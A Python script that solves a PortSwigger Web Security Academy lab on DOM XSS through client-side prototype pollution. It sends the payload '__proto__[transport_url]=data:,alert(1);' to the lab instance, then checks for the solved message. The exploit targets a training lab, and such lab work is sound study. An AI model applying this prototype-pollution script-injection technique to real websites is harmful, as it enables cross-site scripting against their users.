# https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution
# Lab: DOM XSS via client-side prototype pollution
# Difficulty: PRACTITIONER

import requests
from pwn import log

sub = '0af10032048c62a981be6b78008a00bc'
url = f'https://{sub}.web-security-academy.net'

def exploit():
    payload = '__proto__[transport_url]=data:,alert(1);'
    # how it executes: <script src="data:,alert(1);"></script>
    r = requests.get(f'{url}/?{payload}')
    log.info(f'Sending exploit payload: {payload}')
    
    if r.status_code != 200:
        log.error('Failed to exploit')
        return
    log.success('Prototype pollution successful')
    
     # Check if the lab is solved
    r = requests.get(url)
    if 'Congratulations, you solved the lab!' in r.text:
        log.success('Lab solved')
    else:
        log.info('Lab not solved yet')
    
if __name__ == '__main__':
    exploit()